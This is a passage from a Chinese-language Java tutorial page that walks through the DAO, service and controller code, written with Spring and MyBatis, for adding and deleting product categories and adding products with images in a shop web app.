class="hljs-title class_">Result</span>&lt;List&lt;ProductCategory&gt;&gt;(<span class="hljs-literal">false</span>, ps.getState(), ps.getStateInfo());&#125;&#125;&#125;language-java复制代码</code></pre><hr><h2 id="5-4-批量添加商品列表"><a href="#5-4-批量添加商品列表" class="headerlink" title="5.4 批量添加商品列表"></a>5.4 批量添加商品列表</h2><h4 id="5-4-1-dao-层"><a href="#5-4-1-dao-层" class="headerlink" title="5.4.1 dao 层"></a>5.4.1 dao 层</h4><ol><li>ProductCategoryDao.java 接口</li></ol><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProductCategoryDao</span> &#123;<span class="hljs-comment">// 批量新增商品类标</span><span class="hljs-type">int</span> <span class="hljs-title function_">batchInsertProductCategory</span><span class="hljs-params">(List&lt;ProductCategory&gt; productCategoryList)</span>;&#125;language-java复制代码</code></pre><ol><li>mapper ProductCategoryDao.xml</li></ol><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.imooc.o2o.dao.ProductCategoryDao&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;batchInsertProductCategory&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;java.util.List&quot;</span>&gt;</span>INSERT INTOtb_product_category(product_category_name, priority, create_time, shop_id)VALUES<span class="hljs-comment">&lt;!-- collection:遍历 list。separator分隔符:value(xxx),(xxx)  --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">&quot;list&quot;</span> <span class="hljs-attr">item</span>=<span class="hljs-string">&quot;productCategory&quot;</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;index&quot;</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">&quot;,&quot;</span>&gt;</span>(#&#123;productCategory.productCategoryName&#125;,#&#123;productCategory.priority&#125;,#&#123;productCategory.createTime&#125;,#&#123;productCategory.shopId&#125;)<span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>language-xml复制代码</code></pre><ol><li>单元测试 ProductCategoryDaoTest.java</li></ol><pre><code class="hljs java"><span class="hljs-meta">@Test</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testBatchInsertProductCategory</span><span class="hljs-params">()</span> &#123;<span class="hljs-type">ProductCategory</span> <span class="hljs-variable">productCategory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductCategory</span>();productCategory.setProductCategoryName(<span class="hljs-string">&quot;商品类别1&quot;</span>);productCategory.setPriority(<span class="hljs-number">1</span>);productCategory.setCreateTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());productCategory.setShopId(<span class="hljs-number">1L</span>);<span class="hljs-type">ProductCategory</span> <span class="hljs-variable">productCategory2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductCategory</span>();productCategory2.setProductCategoryName(<span class="hljs-string">&quot;商品类别2&quot;</span>);productCategory2.setPriority(<span class="hljs-number">2</span>);productCategory2.setCreateTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());productCategory2.setShopId(<span class="hljs-number">1L</span>);List&lt;ProductCategory&gt; productCategoryList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;ProductCategory&gt;();productCategoryList.add(productCategory);productCategoryList.add(productCategory2);<span class="hljs-type">int</span> <span class="hljs-variable">effectedNum</span> <span class="hljs-operator">=</span> productCategoryDao.batchInsertProductCategory(productCategoryList);assertEquals(<span class="hljs-number">2</span>, effectedNum);&#125;language-java复制代码</code></pre><h4 id="5-4-2-Service-层"><a href="#5-4-2-Service-层" class="headerlink" title="5.4.2 Service 层"></a>5.4.2 Service 层</h4><ol><li>接口 ProductCategoryService.java</li></ol><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.imooc.o2o.dto.ProductCategoryExecution;<span class="hljs-keyword">import</span> com.imooc.o2o.entity.ProductCategory;<span class="hljs-keyword">import</span> com.imooc.o2o.exceptions.ProductCategoryOperationException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProductCategoryService</span> &#123;<span class="hljs-comment">// 查询指定某个店铺下的所有商品类别信息</span>List&lt;ProductCategory&gt; <span class="hljs-title function_">getProductCategoryList</span><span class="hljs-params">(<span class="hljs-type">long</span> shopId)</span>;ProductCategoryExecution <span class="hljs-title function_">batchAddProductCategory</span><span class="hljs-params">(List&lt;ProductCategory&gt; productCategoryList)</span> <span class="hljs-keyword">throws</span> ProductCategoryOperationException;&#125;language-java复制代码</code></pre><ol><li>实现类 ProductCategoryServiceImpl.java</li></ol><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductCategoryServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ProductCategoryService</span> &#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ProductCategoryDao productCategoryDao;<span class="hljs-meta">@Override</span><span class="hljs-keyword">public</span> ProductCategoryExecution <span class="hljs-title function_">batchAddProductCategory</span><span class="hljs-params">(List&lt;ProductCategory&gt; productCategoryList)</span><span class="hljs-keyword">throws</span> ProductCategoryOperationException &#123;<span class="hljs-comment">// TODO Auto-generated method stub</span><span class="hljs-keyword">if</span>(productCategoryList != <span class="hljs-literal">null</span> &amp;&amp; productCategoryList.size() &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 空值判断</span><span class="hljs-keyword">try</span> &#123;<span class="hljs-type">int</span> <span class="hljs-variable">effectedNum</span> <span class="hljs-operator">=</span> productCategoryDao.batchInsertProductCategory(productCategoryList);<span class="hljs-keyword">if</span>(effectedNum &lt;= <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 添加成功</span><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductCategoryOperationException</span>(<span class="hljs-string">&quot;店铺类别创建失败&quot;</span>);&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 添加失败</span><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductCategoryExecution</span>(ProductCategoryStateEnum.SUCCESS);&#125;&#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductCategoryOperationException</span>(<span class="hljs-string">&quot;batchAddProductCategory error: &quot;</span> + e.getMessage());&#125;&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductCategoryExecution</span>(ProductCategoryStateEnum.EMPTY_LIST);&#125;&#125;&#125;language-java复制代码</code></pre><h4 id="5-4-3-Controller-层"><a href="#5-4-3-Controller-层" class="headerlink" title="5.4.3 Controller 层"></a>5.4.3 Controller 层</h4><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/addproductcategorys&quot;, method = RequestMethod.POST)</span><span class="hljs-meta">@ResponseBody</span><span class="hljs-keyword">private</span> Map&lt;String, Object&gt; <span class="hljs-title function_">addProductCategorys</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> List&lt;ProductCategory&gt; productCategoryList,</span><span class="hljs-params">HttpServletRequest request)</span> &#123;Map&lt;String, Object&gt; modelMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<span class="hljs-type">Shop</span> <span class="hljs-variable">currentShop</span> <span class="hljs-operator">=</span> (Shop) request.getSession().getAttribute(<span class="hljs-string">&quot;currentShop&quot;</span>);<span class="hljs-keyword">for</span> (ProductCategory pc : productCategoryList) &#123;pc.setShopId(currentShop.getShopId());&#125;<span class="hljs-keyword">if</span> (productCategoryList != <span class="hljs-literal">null</span> &amp;&amp; productCategoryList.size() &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">try</span> &#123;<span class="hljs-type">ProductCategoryExecution</span> <span class="hljs-variable">pe</span> <span class="hljs-operator">=</span> productCategoryService.batchAddProductCategory(productCategoryList);<span class="hljs-keyword">if</span> (pe.getState() == ProductCategoryStateEnum.SUCCESS.getState()) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">true</span>);&#125; <span class="hljs-keyword">else</span> &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, pe.getStateInfo());&#125;&#125; <span class="hljs-keyword">catch</span> (ProductCategoryOperationException e) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, e.toString());<span class="hljs-keyword">return</span> modelMap;&#125;&#125; <span class="hljs-keyword">else</span> &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, <span class="hljs-string">&quot;请至少输入一个商品类别&quot;</span>);&#125;<span class="hljs-keyword">return</span> modelMap;&#125;language-java复制代码</code></pre><h2 id="5-5-删除商品类别"><a href="#5-5-删除商品类别" class="headerlink" title="5.5 删除商品类别"></a>5.5 删除商品类别</h2><h4 id="5-5-1-dao-层"><a href="#5-5-1-dao-层" class="headerlink" title="5.5.1 dao 层"></a>5.5.1 dao 层</h4><ol><li>接口 ProductCategoryDao.java</li></ol><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProductCategoryDao</span> &#123;<span class="hljs-comment">// 删除指定商品类别, 如果有两个参数，mybatis认不出来，必须使用@param注解来标识</span><span class="hljs-comment">// 加多参数 shopId 是为了防止不是本店铺的对商品列表的操作</span><span class="hljs-type">int</span> <span class="hljs-title function_">deleteProductCategory</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;productCategoryId&quot;)</span> <span class="hljs-type">long</span> productCategoryId, <span class="hljs-meta">@Param(&quot;shopId&quot;)</span> <span class="hljs-type">long</span> shopId)</span>;&#125;language-java复制代码</code></pre><ol><li>mapper ProductCategory.xml</li></ol><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deleteProductCategory&quot;</span>&gt;</span>DELETE FROMtb_product_categoryWHEREproduct_category_id = #&#123;productCategoryId&#125;AND shop_id = #&#123;shopId&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span>language-xml复制代码</code></pre><ol><li>单元测试 ProductCategoryDaoTest.java</li></ol><pre><code class="hljs java"><span class="hljs-comment">// junit回环，测试添加测试数据，和删除测试数据。对数据库没有影响。推荐设计 junit 回环</span><span class="hljs-meta">@Test</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testCDeleteProductCategory</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<span class="hljs-type">long</span> <span class="hljs-variable">shopId</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;List&lt;ProductCategory&gt; productCategoryList = productCategoryDao.queryProductCategoryList(shopId);<span class="hljs-keyword">for</span>(ProductCategory pc : productCategoryList) &#123;<span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;商品类别1&quot;</span>.equals(pc.getProductCategoryName()) || <span class="hljs-string">&quot;商品类别2&quot;</span>.equals(pc.getProductCategoryName())) &#123;<span class="hljs-type">int</span> <span class="hljs-variable">effectedNum</span> <span class="hljs-operator">=</span> productCategoryDao.deleteProductCategory(pc.getProductCategoryId(), shopId);assertEquals(<span class="hljs-number">1</span>, effectedNum);&#125;&#125;&#125;language-java复制代码</code></pre><h4 id="5-5-2-Serivce-层"><a href="#5-5-2-Serivce-层" class="headerlink" title="5.5.2 Serivce 层"></a>5.5.2 Serivce 层</h4><ol><li>接口 ProductCategoryService.java</li></ol><pre><code class="hljs java"><span class="hljs-comment">// 将此类别下的商品里的类别id置为空，再删除掉该商品类别</span>ProductCategoryExecution <span class="hljs-title function_">deleteProductCategory</span><span class="hljs-params">(<span class="hljs-type">long</span> productCategoryId, <span class="hljs-type">long</span> shopId)</span> <span class="hljs-keyword">throws</span> ProductCategoryOperationException;language-java复制代码</code></pre><ol><li>实现类 ProductCategoryServiceImpl.java</li></ol><pre><code class="hljs java"><span class="hljs-comment">// 删除商品类别</span><span class="hljs-meta">@Override</span><span class="hljs-meta">@Transactional</span> <span class="hljs-comment">//事务管理注解：该方法进行有2步操作：删除商品类别，将此商品类别下的商品id置为空，同时操作完成后再提交。</span><span class="hljs-keyword">public</span> ProductCategoryExecution <span class="hljs-title function_">deleteProductCategory</span><span class="hljs-params">(<span class="hljs-type">long</span> productCategoryId, <span class="hljs-type">long</span> shopId)</span><span class="hljs-keyword">throws</span> ProductCategoryOperationException &#123;<span class="hljs-keyword">try</span> &#123;<span class="hljs-type">int</span> <span class="hljs-variable">effectedNum</span> <span class="hljs-operator">=</span> productCategoryDao.deleteProductCategory(productCategoryId, shopId);<span class="hljs-keyword">if</span>(effectedNum &lt;= <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductCategoryOperationException</span>(<span class="hljs-string">&quot;商品类别删除失败&quot;</span>);&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductCategoryExecution</span>(ProductCategoryStateEnum.SUCCESS);&#125;&#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductCategoryOperationException</span>(<span class="hljs-string">&quot;deleteProductCategory error: &quot;</span> + e.getMessage());&#125;&#125;language-java复制代码</code></pre><h4 id="5-5-3-Controller-层"><a href="#5-5-3-Controller-层" class="headerlink" title="5.5.3 Controller 层"></a>5.5.3 Controller 层</h4><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/removeproductcategorys&quot;, method = RequestMethod.POST)</span><span class="hljs-meta">@ResponseBody</span><span class="hljs-keyword">private</span> Map&lt;String, Object&gt; <span class="hljs-title function_">removeProductCategorys</span><span class="hljs-params">(Long productCategoryId, HttpServletRequest request)</span> &#123;Map&lt;String, Object&gt; modelMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<span class="hljs-keyword">if</span> (productCategoryId != <span class="hljs-literal">null</span> &amp;&amp; productCategoryId &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">try</span> &#123;<span class="hljs-type">Shop</span> <span class="hljs-variable">currentShop</span> <span class="hljs-operator">=</span> (Shop) request.getSession().getAttribute(<span class="hljs-string">&quot;currentShop&quot;</span>);<span class="hljs-type">ProductCategoryExecution</span> <span class="hljs-variable">pe</span> <span class="hljs-operator">=</span> productCategoryService.deleteProductCategory(productCategoryId, currentShop.getShopId());<span class="hljs-keyword">if</span> (pe.getState() == ProductCategoryStateEnum.SUCCESS.getState()) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">true</span>);&#125; <span class="hljs-keyword">else</span> &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, pe.getStateInfo());&#125;&#125; <span class="hljs-keyword">catch</span> (ProductCategoryOperationException e) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, e.toString());<span class="hljs-keyword">return</span> modelMap;&#125;&#125; <span class="hljs-keyword">else</span> &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, <span class="hljs-string">&quot;请至少选择一个商品类别&quot;</span>);&#125;<span class="hljs-keyword">return</span> modelMap;&#125;language-java复制代码</code></pre><hr><h1 id="6、商品管理"><a href="#6、商品管理" class="headerlink" title="6、商品管理"></a>6、商品管理</h1><h2 id="6-1-商品添加，-商品详情图批量添加"><a href="#6-1-商品添加，-商品详情图批量添加" class="headerlink" title="6.1 商品添加， 商品详情图批量添加"></a>6.1 商品添加， 商品详情图批量添加</h2><p>实现商品添加，掌握批量图片添加</p><h4 id="6-1-1"><a href="#6-1-1" class="headerlink" title="6.1.1"></a>6.1.1</h4><ol><li>接口 ProductImgDao.java &amp; ProductDao.java</li></ol><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProductImgDao</span> &#123;<span class="hljs-comment">// 批量添加商品详情图片</span><span class="hljs-type">int</span> <span class="hljs-title function_">batchInsertProductImg</span><span class="hljs-params">(List&lt;ProductImg&gt; productImgList)</span>;&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProductDao</span> &#123;<span class="hljs-comment">// 添加商品</span><span class="hljs-type">int</span> <span class="hljs-title function_">insertProduct</span><span class="hljs-params">(Product product)</span>;&#125;language-java复制代码</code></pre><ol><li>mapper ProductImgDao.xml &amp; ProductDao.xml</li></ol><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.imooc.o2o.dao.ProductImgDao&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 参数类型是List --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;batchInsertProductImg&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;java.util.List&quot;</span>&gt;</span>INSERT INTOtb_product_img(img_addr, img_desc, priority, create_time,product_id)VALUES<span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">&quot;list&quot;</span> <span class="hljs-attr">item</span>=<span class="hljs-string">&quot;productImg&quot;</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;index&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">separator</span>=<span class="hljs-string">&quot;,&quot;</span>&gt;</span>(#&#123;productImg.imgAddr&#125;,#&#123;productImg.imgDesc&#125;,#&#123;productImg.priority&#125;,#&#123;productImg.createTime&#125;,#&#123;productImg.productId&#125;)<span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.imooc.o2o.dao.ProductDao&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insertProduct&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;com.imooc.o2o.entity.Product&quot;</span> <span class="hljs-attr">useGeneratedKeys</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">keyProperty</span>=<span class="hljs-string">&quot;productId&quot;</span> <span class="hljs-attr">keyColumn</span>=<span class="hljs-string">&quot;product_id&quot;</span>&gt;</span>INSERT INTOtb_product(product_name, product_desc, img_addr, normal_price, promotion_price, priority, create_time, last_edit_time,enable_status, product_category_id, shop_id)VALUES(#&#123;productName&#125;, #&#123;productDesc&#125;, #&#123;imgAddr&#125;, #&#123;normalPrice&#125;, #&#123;promotionPrice&#125;, #&#123;priority&#125;, #&#123;createTime&#125;, #&#123;lastEditTime&#125;,#&#123;enableStatus&#125;, #&#123;productCategory.productCategoryId&#125;, #&#123;shop.shopId&#125;)<span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>language-xml复制代码</code></pre><ol><li>单元测试 ProductImgDaoTest.java &amp; ProductDaoTest.java</li></ol><pre><code class="hljs java"><span class="hljs-meta">@FixMethodOrder(MethodSorters.NAME_ASCENDING)</span> <span class="hljs-comment">// 按照名字顺序执行测试方法</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductImgDaoTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTest</span>&#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ProductImgDao productImgDao;<span class="hljs-meta">@Test</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testABatchInsertProductImgDao</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<span class="hljs-comment">// productId 为1的商品里添加两个详情图记录</span>ProductImg productImg1= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductImg</span>();productImg1.setImgAddr(<span class="hljs-string">&quot;图片1&quot;</span>);productImg1.setImgDesc(<span class="hljs-string">&quot;测试图片1&quot;</span>);productImg1.setPriority(<span class="hljs-number">1</span>);productImg1.setCreateTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());productImg1.setProductId(<span class="hljs-number">1L</span>);ProductImg productImg2= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductImg</span>();productImg2.setImgAddr(<span class="hljs-string">&quot;图片2&quot;</span>);productImg2.setImgDesc(<span class="hljs-string">&quot;测试图片2&quot;</span>);productImg2.setPriority(<span class="hljs-number">1</span>);productImg2.setCreateTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());productImg2.setProductId(<span class="hljs-number">1L</span>);List&lt;ProductImg&gt; productImgList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;ProductImg&gt;();productImgList.add(productImg1);productImgList.add(productImg2);<span class="hljs-type">int</span> <span class="hljs-variable">effectedNum</span> <span class="hljs-operator">=</span> productImgDao.batchInsertProductImg(productImgList);assertEquals(<span class="hljs-number">2</span>, effectedNum);&#125;&#125;FixMethodOrder(MethodSorters.NAME_ASCENDING) <span class="hljs-comment">// 按测试方法名字的顺序执行测试</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductDaoTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTest</span> &#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ProductDao productDao;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ProductImgDao productImgDao;<span class="hljs-meta">@Test</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testAInsertProduct</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<span class="hljs-type">Shop</span> <span class="hljs-variable">shop1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shop</span>();shop1.setShopId(<span class="hljs-number">1L</span>);<span class="hljs-type">ProductCategory</span> <span class="hljs-variable">pc1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductCategory</span>();pc1.setProductCategoryId(<span class="hljs-number">1L</span>);<span class="hljs-comment">// 初始化三个商品实例并添加进shopId为1的店铺里，同时商品类别Id也为1</span><span class="hljs-type">Product</span> <span class="hljs-variable">product1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();product1.setProductName(<span class="hljs-string">&quot;测试1&quot;</span>);product1.setProductDesc(<span class="hljs-string">&quot;测试Desc1&quot;</span>);product1.setImgAddr(<span class="hljs-string">&quot;test1&quot;</span>);product1.setPriority(<span class="hljs-number">1</span>);product1.setEnableStatus(<span class="hljs-number">1</span>);product1.setCreateTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());product1.setLastEditTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());product1.setShop(shop1);product1.setProductCategory(pc1);<span class="hljs-type">Product</span> <span class="hljs-variable">product2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();product2.setProductName(<span class="hljs-string">&quot;测试2&quot;</span>);product2.setProductDesc(<span class="hljs-string">&quot;测试Desc2&quot;</span>);product2.setImgAddr(<span class="hljs-string">&quot;test2&quot;</span>);product2.setPriority(<span class="hljs-number">2</span>);product2.setEnableStatus(<span class="hljs-number">0</span>);product2.setCreateTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());product2.setLastEditTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());product2.setShop(shop1);product2.setProductCategory(pc1);<span class="hljs-type">Product</span> <span class="hljs-variable">product3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();product3.setProductName(<span class="hljs-string">&quot;test3&quot;</span>);product3.setProductDesc(<span class="hljs-string">&quot;测试Desc3&quot;</span>);product3.setImgAddr(<span class="hljs-string">&quot;test3&quot;</span>);product3.setPriority(<span class="hljs-number">3</span>);product3.setEnableStatus(<span class="hljs-number">1</span>);product3.setCreateTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());product3.setLastEditTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());product3.setShop(shop1);product3.setProductCategory(pc1);<span class="hljs-comment">// 判断添加是否成功</span><span class="hljs-type">int</span> <span class="hljs-variable">effectedNum</span> <span class="hljs-operator">=</span> productDao.insertProduct(product1);assertEquals(<span class="hljs-number">1</span>, effectedNum);effectedNum = productDao.insertProduct(product2);assertEquals(<span class="hljs-number">1</span>, effectedNum);effectedNum = productDao.insertProduct(product3);assertEquals(<span class="hljs-number">1</span>, effectedNum);&#125;&#125;language-java复制代码</code></pre><h4 id="6-1-2-service-层"><a href="#6-1-2-service-层" class="headerlink" title="6.1.2 service 层"></a>6.1.2 service 层</h4><ol><li>接口 ProductService.java</li></ol><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProductService</span> &#123;<span class="hljs-comment">// 添加商品信息以及图片处理。思路：1.处理缩略图;2.处理商品详情图片;3.添加商品信息</span><span class="hljs-comment">//ProductExecution addProduct(Product product, InputStream thumbnail, String thumbnailName, List&lt;InputStream&gt; productImgList, List&lt;String&gt; productImgNameList) throws ProductOperationException;</span><span class="hljs-comment">// 封装 图片和图片名</span>ProductExecution <span class="hljs-title function_">addProduct</span><span class="hljs-params">(Product product, ImageHolder thumbnail, List&lt;ImageHolder&gt; productImgList)</span> <span class="hljs-keyword">throws</span> ProductOperationException;&#125;language-java复制代码</code></pre><ol><li>实现类</li></ol><pre><code class="hljs java"><span class="hljs-meta">@Service</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ProductService</span>&#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ProductDao productDao;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ProductImgDao productImgDao;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 添加缩略图(和店铺注册一样)</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> product</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> thumbnail</span><span class="hljs-comment"> */</span><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addThumbnail</span><span class="hljs-params">(Product product, ImageHolder thumbnail)</span> &#123;<span class="hljs-type">String</span> <span class="hljs-variable">dest</span> <span class="hljs-operator">=</span> 